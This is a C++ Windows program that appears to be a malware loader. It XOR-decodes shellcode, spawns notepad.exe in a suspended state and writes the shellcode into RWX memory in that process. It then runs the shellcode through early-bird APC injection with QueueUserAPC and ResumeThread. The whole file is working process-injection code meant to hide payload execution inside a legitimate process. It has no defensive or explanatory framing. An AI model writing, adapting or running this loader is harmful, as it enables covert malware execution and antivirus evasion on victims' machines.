#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <string>

#include "Decoder.h"
#include "Mutate.h"

//add xor key
const std::string key = "";

int main()
{
    std::vector<uint8_t>  shellcode = mutate();
    XOR(shellcode.data() , shellcode.size() , key , 5 );

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    BOOL cprocess = CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi
    );

    if (!cprocess)
    {
        std::cout << "Error: Failed to create process. Error code: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "Success: Process created in suspended state." << std::endl;

    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL)
    {
        std::cout << "Error: Failed to allocate memory in remote process. Error code: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    std::cout << "Success: Memory allocated in remote process." << std::endl;
    
 

    BOOL wprocess = WriteProcessMemory(pi.hProcess, mem, shellcode.data(), shellcode.size(), NULL);
    if (!wprocess)
    {
        std::cout << "Error: Failed to write shellcode to remote process. Error code: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    std::cout << "Success: Shellcode written to remote process memory." << std::endl;

    DWORD oldProtect;
    BOOL pprocess = VirtualProtectEx(pi.hProcess, mem, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!pprocess)
    {
        std::cout << "Error: Failed to change memory protection. Error code: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    std::cout << "Success: Memory protection changed to executable." << std::endl;

    QueueUserAPC((PAPCFUNC)mem, pi.hThread, (ULONG_PTR)mem);
    std::cout << "Success: APC queued for execution." << std::endl;

    ResumeThread(pi.hThread);
    std::cout << "Success: Thread resumed. Shellcode should now execute." << std::endl;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
